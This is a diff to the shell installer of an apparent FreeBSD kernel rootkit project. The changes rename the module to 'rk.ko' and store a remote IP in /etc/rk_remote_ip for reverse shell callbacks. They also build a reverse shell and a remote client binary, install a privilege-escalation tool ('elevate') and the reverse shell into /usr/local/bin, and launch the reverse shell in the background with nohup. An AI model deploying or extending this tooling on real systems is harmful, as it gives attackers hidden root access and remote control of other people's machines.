@@ -2,21 +2,24 @@
 
 set -eu
 
-# CURRENTLY DOES NOT SUPPORT PERSISTENCE, ADD LATER
+REMOTE_IP="${1:-}"
+if [ -z "$REMOTE_IP" ]; then
+    printf '[!] Note: No REMOTE_IP argument provided\n' >&2
+fi
 
 PROJECT_DIR=$(CDPATH= cd -P "$(dirname "$0")" && pwd)
 MODULE_DIR="$PROJECT_DIR/kernel"
-MODULE_FILE="$MODULE_DIR/rootkit.ko"
+MODULE_FILE="$MODULE_DIR/rk.ko"
 USERSPACE_DIR="$PROJECT_DIR/user"
 ELEVATE_SRC="$USERSPACE_DIR/elevate.c"
 ELEVATE_BIN="$USERSPACE_DIR/elevate"
+REMOTE_SRC="$PROJECT_DIR/remote.c"
+REMOTE_BIN="$PROJECT_DIR/remote"
 
-fail()
-{
-	printf 'Installation Error: %s\n' "$*" >&2
-	exit 1
+fail() {
+    printf 'Installation Error: %s\n' "$*" >&2
+    exit 1
 }
-
 
 # Checks for root privileges, FreeBSD OS, and required commands
 [ "$(id -u)" -eq 0 ] || fail "Run this script as root"
@@ -24,54 +27,58 @@ fail()
 [ -d "$MODULE_DIR" ] || fail "Kernel directory not found: $MODULE_DIR"
 [ -f "$ELEVATE_SRC" ] || fail "Source file not found: $ELEVATE_SRC"
 
+# Store REMOTE IP for reverse shell callbacks
+echo "$REMOTE_IP" > /etc/rk_remote_ip
 
 # Check dependencies
 for command in make kldload kldstat cc install; do
-    command -v "$command" >/dev/null 2>&1 ||
-        fail "Required command not found: $command"
+    command -v "$command" >/dev/null 2>&1 || fail "Required command not found: $command"
 done
 
-
-# Build rootkit.ko
-printf '%s\n' '[*] Building rootkit.ko...'
+# Build rk.ko
+printf '%s\n' '[*] Building rk.ko...'
 make -C "$MODULE_DIR"
 [ -f "$MODULE_FILE" ] || fail "build could not create $MODULE_FILE"
-
 
 # Build elevate
 printf '%s\n' '[*] Building elevate...'
 cc -Wall -Wextra -o "$ELEVATE_BIN" "$ELEVATE_SRC" || fail "Failed to build elevate"
 
+# Build revshell inside $MODULE_DIR
+printf '%s\n' '[*] Building revshell...'
+cc -Wall -Wextra -I. -I"$MODULE_DIR" -o "$MODULE_DIR/revshell" "$MODULE_DIR/revshell.c" || fail "Failed to build revshell"
+chmod 755 "$MODULE_DIR/revshell"
 
-# Load rootkit.ko
-if kldstat -q -m rootkit >/dev/null 2>&1; then
-	printf '%s\n' '[*] rootkit.ko is already loaded'
+printf '%s\n' '[*] Building remote client binary...'
+cc -O2 -Wall -o "$REMOTE_BIN" "$REMOTE_SRC" || fail "Failed to build remote client binary"
+chmod 755 "$REMOTE_BIN"
+
+# Load rk.ko
+if kldstat -q -m rk >/dev/null 2>&1; then
+    printf '%s\n' '[*] rk.ko is already loaded'
 else
-	printf '%s\n' '[*] Loading rootkit.ko...'
-	kldload "$MODULE_FILE"
+    printf '%s\n' '[*] Loading rk.ko...'
+    kldload "$MODULE_FILE"
 fi
 
-
-# Check if rootkit.ko is loaded
-kldstat -q -m rootkit >/dev/null 2>&1 ||
-	fail "rootkit.ko was not found in the kernel module list after loading"
-
+# Check if rk.ko is loaded
+kldstat -q -m rk >/dev/null 2>&1 || fail "rk.ko was not found in the kernel module list after loading"
 
 # Verify elevate was built successfully
 [ -f "$ELEVATE_BIN" ] || fail "Build did not create $ELEVATE_BIN"
 [ -x "$ELEVATE_BIN" ] || fail "$ELEVATE_BIN is not executable"
 
+# Install binaries to /usr/local/bin
+printf '%s\n' '[*] Installing binaries to /usr/local/bin...'
+install -d -m 755 /usr/local/bin || fail "Failed to create /usr/local/bin"
+install -m 755 "$ELEVATE_BIN" /usr/local/bin/elevate || fail "Failed to install elevate"
+install -m 755 "$MODULE_DIR/revshell" /usr/local/bin/revshell || fail "Failed to install revshell"
 
-# Install elevate
-printf '%s\n' '[*] Installing elevate...'
-install -d -m 755 /usr/local/bin ||
-    fail "Failed to create /usr/local/bin"
-
-install -m 755 "$ELEVATE_BIN" /usr/local/bin/elevate ||
-    fail "Failed to install elevate"
-
+# Launch revshell background worker using the installed binary path
+pkill -f revshell 2>/dev/null || true
+nohup /usr/local/bin/revshell >/dev/null 2>&1 &
 
 # Print completion message
 printf '%s\n' '[+] Installation complete; module entry:'
-kldstat -m rootkit
-printf '%s\n' '[*] Unload with: kldunload rootkit'
+kldstat -m rk
+printf '%s\n' '[*] Unload with: kldunload rk'
